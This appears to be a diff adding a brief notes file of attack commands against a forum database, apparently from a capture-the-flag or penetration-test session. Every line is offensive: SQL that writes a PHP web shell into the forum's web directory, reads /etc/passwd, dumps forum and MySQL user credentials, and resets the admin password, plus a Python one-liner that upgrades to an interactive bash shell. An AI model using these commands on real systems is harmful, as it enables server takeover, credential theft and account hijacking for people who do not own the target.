@@ -1,0 +1,8 @@
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/shell.php"
+SELECT LOAD_FILE('/etc/passwd');
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+select user_name,user_pw,user_type,user_id from mlf2_userdata;
+select Host,User,Password from user;
+
+UPDATE forum_db.mlf2_userdata set user_pw=PASSWORD('getrekt') WHERE user_name='admin';
